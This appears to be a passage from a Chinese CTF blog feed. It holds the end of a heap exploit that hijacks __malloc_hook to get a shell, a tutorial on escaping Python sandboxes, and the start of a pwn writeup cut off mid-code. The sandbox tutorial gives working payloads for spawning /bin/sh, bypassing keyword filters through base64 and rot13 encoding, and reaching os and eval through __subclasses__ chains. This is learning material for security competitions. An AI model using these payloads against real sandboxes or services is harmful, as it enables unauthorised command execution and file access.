libc+0x4526a</span><br><span class="line">print hex(one)</span><br><span class="line"></span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line"></span><br><span class="line">#------------------hjack malloc_hook to getshell-----------</span><br><span class="line">dele(5)</span><br><span class="line">edit(6,p64(libc+0x3c4b20-0x33))</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line">new(&apos;a&apos;*0x13+p64(one)+p64(0)*9)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(&apos;end&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;太菜了，堆的题要么找不到洞，要么找不到好的思路，得加紧训练&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;your-pwn&quot;&gt;&lt;a href=&quot;#your-pwn&quot; class=&quot;headerlink&quot; title=&quot;your_pwn&quot;&gt;&lt;/a&gt;your_pwn&lt;/h1&gt;&lt;h2
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Escape from python-jail</title>
    <link href="http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/"/>
    <id>http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/</id>
    <published>2019-04-08T13:05:19.000Z</published>
    <updated>2019-05-09T07:55:50.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-沙盒"><a href="#python-沙盒" class="headerlink" title="python 沙盒"></a>python 沙盒</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>python沙盒逃逸其实就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p><p>从这个角度来讲，沙盒逃逸本身更像是偏web的东西，就像是sql注入在被过滤的剩余字符中通过骚操作来执行不该被执行的命令一样。</p><h2 id="关于查看目标主机是否为docker"><a href="#关于查看目标主机是否为docker" class="headerlink" title="关于查看目标主机是否为docker"></a>关于查看目标主机是否为docker</h2><ol><li>cat /proc/self/cgroup</li><li>mount -v</li></ol><h2 id="任意执行命令的一些函数和模块"><a href="#任意执行命令的一些函数和模块" class="headerlink" title="任意执行命令的一些函数和模块"></a>任意执行命令的一些函数和模块</h2><ol start="0"><li><strong>import</strong> 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&apos;os&apos;).system(&apos;dir&apos;)</span><br></pre></td></tr></table></figure><ol><li>os 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">os.popen(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure><p>很少不被禁，不然很容易被利用getshell<br>官方文档 <a href="https://docs.python.org/2/library/os.html" target="_blank" rel="noopener">https://docs.python.org/2/library/os.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(&quot;/bin/sh&quot;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure><ol start="2"><li>exec &amp; eval 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br><span class="line"></span><br><span class="line">exec(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br></pre></td></tr></table></figure><p>两个执行函数，没什么可说的。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&apos;__import__(&quot;os&quot;).system(&quot;/bin/sh&quot;)&apos;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure></p><ol start="3"><li>execfile 函数</li></ol><p>执行文件，主要用于引入模块来执行命令<br>python3不存在</p><ol start="4"><li>timeit 函数 from timeit 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;,number=1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import timeit</span><br><span class="line">&gt;&gt;&gt; timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;sh&quot;)&apos;,number=1)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure><ol start="5"><li>platform 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform </span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure><p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import platform </span><br><span class="line">&gt;&gt;&gt; print platform.popen(&apos;dir&apos;).read()</span><br><span class="line">jail.py</span><br></pre></td></tr></table></figure><ol start="7"><li>commands 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">print commands.getstatusoutput(&quot;dir&quot;)</span><br></pre></td></tr></table></figure><p>依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import commands</span><br><span class="line">&gt;&gt;&gt; print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">flag  jail.py</span><br><span class="line">&gt;&gt;&gt; print commands.getstatusoutput(&quot;dir&quot;)</span><br><span class="line">(0, &apos;flag  jail.py&apos;)</span><br></pre></td></tr></table></figure><ol start="8"><li>subprocess模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.call([&apos;ls&apos;],shell=True)</span><br></pre></td></tr></table></figure><p>shell=True 命令本身被bash启动，支持shell启动，否则不支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.call([&apos;ls&apos;],shell=True)</span><br><span class="line">flag  jail.py</span><br></pre></td></tr></table></figure><ol start="9"><li>compile 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>菜鸟：<a href="http://www.runoob.com/python/python-func-compile.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-compile.html</a></p><ol start="10"><li>f修饰符</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f&apos;&#123;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure><p>python 3.6加上的新特性，用f,F修饰的字符串可以执行代码。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ol><li>file 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&apos;flag.txt&apos;).read()</span><br></pre></td></tr></table></figure><ol start="2"><li>open 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&apos;flag.txt&apos;).read()</span><br></pre></td></tr></table></figure><ol start="3"><li><p>codecs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&apos;test.txt&apos;).read()</span><br></pre></td></tr></table></figure></li><li><p>Filetype 函数 from types 模块</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line">print types.FileType(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure><p>可以用来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; print types.FileType(&quot;flag&quot;).read()</span><br><span class="line">flag_here</span><br></pre></td></tr></table></figure></p><p>关于python内部查看版本号，可以使用sys模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; print sys.version</span><br><span class="line">2.7.12 (default, Nov 12 2018, 14:36:49) </span><br><span class="line">[GCC 5.4.0 20160609]</span><br></pre></td></tr></table></figure><h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><h3 id="import-os-引入"><a href="#import-os-引入" class="headerlink" title="import / os 引入"></a>import / os 引入</h3><p>使用内联函数：</p><ol><li><strong>import</strong>函数</li></ol><p><strong>import</strong>函数本身是用来动态的导入模块，比如：<strong>import</strong>(module) == import module</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = __import__(&quot;bf&quot;.decode(&apos;rot_13&apos;))       //os </span><br><span class="line">a.system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure><p>importlib库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">a = importlib.import_module(&quot;bf&quot;.decode(&apos;rot_13&apos;))    //os</span><br><span class="line">a.system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>builtins</strong>函数</li></ol><p>使用 python 内置函数 <strong>builtins</strong> (该函数模块中的函数都被自动引入，不需要再单独引入) , dir(<strong>builtins</strong>) 查看剩余可用内置函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(__builtins__)</span><br><span class="line">[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</span><br></pre></td></tr></table></figure><p>这里是在没有禁用函数时的情况， 可以看到里面有一些一般不会禁用的函数比如说对文件的操作函数 open，int，chr等，还有dict函数</p><p>一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”],我们就可以用一些编码来绕过字符明文检测。</p><p>所以可以有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).system(&apos;sh&apos;)   == __builtins__.__dict__[_import__](&apos;os&apos;).system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure></p><ol start="3"><li>路径引入os等模块</li></ol><p>因为一般都是禁止引入敏感包，当禁用os时，实际上就是  sys.modules[‘os’]=None</p><p>而因为一般的类unix系统的python os路径都是/usr/lib/python2.7/os.py  ,所以可以通过路径引入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos;</span><br></pre></td></tr></table></figure><ol start="4"><li>reload</li></ol><p>禁止引用某些函数时，可能会删除掉一些函数的引用,比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&apos;__import__&apos;]</span><br></pre></td></tr></table></figure></p><p>这样就无法再引入，但是我们可以用 reload(<strong>builtins</strong>) 重载<strong>builtins</strong>模块恢复内置函数</p><p>但是reload本身也是<strong>builtins</strong>模块的函数，其本身也可能会被禁掉</p><p>在可以引用包的情况下，我们还可以使用imp模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import __builtins__</span><br><span class="line">import imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure><p>这样就可以得到完整的<strong>builtins</strong>模块了，需要注意的是需要先import <strong>builtins</strong> ,如果不写的话，虽然<strong>builtins</strong>模块已经被引入，但是它实际上是不可见的，即它仍然无法被找到,这里是这么说的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句import __builtins__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。</span><br></pre></td></tr></table></figure><p>再如果imp的reload被禁用掉呢？同时禁用掉路径引入需要的sys模块呢？<br>可以尝试上面的execfile()函数,或者open函数打开文件，exec执行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br></pre></td></tr></table></figure><ol start="5"><li>函数名字符串扫描过滤的绕过</li></ol><p>假如沙箱本身不是通过对包的限制，而是扫描函数字符串，关键码等等来过滤的；而关键字和函数没有办法直接用字符串相关的编码或解密操作</p><p>这里就可以使用： getattr &amp;&amp; <strong>getattribute</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(&quot;os&quot;),&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">getattr(__import__(&quot;os&quot;),&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).__getattribute__(&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).__getattribute__(&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)</span><br></pre></td></tr></table></figure><p>runoob ：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果某个类定义了 getattr() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。</span><br><span class="line">如果某个类定义了 __getattribute__() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。</span><br></pre></td></tr></table></figure></p><h3 id="object-命令引入执行"><a href="#object-命令引入执行" class="headerlink" title="object 命令引入执行"></a>object 命令引入执行</h3><p>object 类中集成了很多基础函数，我们也可以用object来进行调用的操作</p><p>对于字符串对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &apos;object&apos;&gt;,)</span><br></pre></td></tr></table></figure></p><p>通过<strong>base</strong>方法可以获取上一层继承关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure><p>通过<strong>mro</strong>方法获取继承关系</p><p>所以最常见的创建object对象的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>在获取之后，返回的是一个元组，通过下标+<strong>subclasses</strong>的方法可以获取所有子类的列表。而<strong>subclasses</strong>()第40个是file类型的object。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>所以可以读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;jail.py&quot;).read()</span><br></pre></td></tr></table></figure></p><p>同时写文件或执行任意命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;,&quot;w&quot;).write(&quot;1111&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;jail.py&quot;).read()&apos; )</span><br></pre></td></tr></table></figure></p><p>可以执行命令寻找subclasses下引入过os模块的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a><br><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a><br><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python-沙盒&quot;&gt;&lt;a href=&quot;#python-沙盒&quot; class=&quot;headerlink&quot; title=&quot;python 沙盒&quot;&gt;&lt;/a&gt;python 沙盒&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="python" scheme="http://siriuswhiter.tk/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-pwn prac</title>
    <link href="http://siriuswhiter.tk/2019/04/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-prac/"/>
    <id>http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/</id>
    <published>2019-04-06T06:32:55.000Z</published>
    <updated>2019-04-22T12:03:12.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="100levels"><a href="#100levels" class="headerlink" title="100levels"></a>100levels</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>两个功能： go hint</p><p>go:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall go(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ST0C_4</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-120h]</span><br><span class="line">  __int64 num2; // [rsp+0h] [rbp-120h]</span><br><span class="line">  int v6; // [rsp+8h] [rbp-118h]</span><br><span class="line">  __int64 num1; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 num1a; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 cnt; // [rsp+18h] [rbp-108h]</span><br><span class="line">  __int64 v10; // [rsp+20h] [rbp-100h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;How many levels?&quot;);</span><br><span class="line">  v4 = get_num();</span><br><span class="line">  if ( v4 &gt; 0 )</span><br><span class="line">    num1 = v4;</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Coward&quot;);</span><br><span class="line">  puts(&quot;Any more?&quot;);</span><br><span class="line">  num2 = get_num();</span><br><span class="line">  num1a = num1 + num2;</span><br><span class="line">  if ( num1a &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( num1a &lt;= 99 )</span><br><span class="line">    &#123;</span><br><span class="line">      cnt = num1a;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You are being a real man.&quot;);</span><br><span class="line">      cnt = 100LL;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Let&apos;s go!&apos;&quot;);</span><br><span class="line">    v6 = time(0LL);</span><br><span class="line">    if ( (unsigned int)check(cnt) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = 